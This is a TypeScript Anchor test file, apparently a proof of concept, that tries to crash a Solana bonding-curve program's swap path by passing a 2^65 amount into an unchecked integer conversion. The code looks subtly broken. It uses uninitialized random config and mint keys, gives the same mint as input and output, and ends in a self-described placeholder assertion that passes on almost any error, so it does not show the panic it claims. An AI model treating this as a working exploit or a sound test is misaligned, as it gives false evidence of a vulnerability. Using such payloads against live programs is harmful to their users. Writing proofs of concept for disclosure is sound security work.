import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Keypair } from "@solana/web3.js";
import { expect } from "chai";
import { DynamicBondingCurve } from "../target/types/dynamic_bonding_curve";
import {
  createPoolWithSplToken,
  swap2,
} from "./instructions/userInstructions";

describe("PoC: Trigger unwrap panic in swap path", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.DynamicBondingCurve as Program<DynamicBondingCurve>;

  it("panics when U256 value > u64.MAX reaches try_into().unwrap()", async () => {
    // 1. Generate necessary accounts
    const payer = provider.wallet;
    const poolCreator = Keypair.generate();

    // 2. Initialize pool with huge liquidity in config via createPoolWithSplToken
    const configPubkey = Keypair.generate().publicKey;
    const quoteMint = anchor.web3.Keypair.generate().publicKey;

    const pool = await createPoolWithSplToken(
      provider.connection,
      program,
      {
        payer: payer.payer as any,
        poolCreator,
        quoteMint,
        config: configPubkey,
        instructionParams: { name: "PoC", symbol: "POC", uri: "" },
      }
    );

    // 3. Perform a swap with insane amount to overflow u64
    const hugeAmountIn = new anchor.BN("36893488147419103232"); // 2^65 (overflow)
    const minAmountOut = new anchor.BN("1"); // minimal

    try {
      await swap2(
        provider.connection,
        program,
        {
          config: configPubkey,
          payer: payer.payer as any,
          pool,
          inputTokenMint: quoteMint,
          outputTokenMint: quoteMint,
          amount0: hugeAmountIn,
          amount1: minAmountOut,
          swapMode: 1,
          referralTokenAccount: null,
        }
      );
      expect.fail("Expected panic due to unchecked try_into().unwrap()");
    } catch (err: any) {
      console.log("Error captured as expected:", err.toString());
      expect(err.toString()).to.include("failed to complete");  // placeholder check
    }
  });
});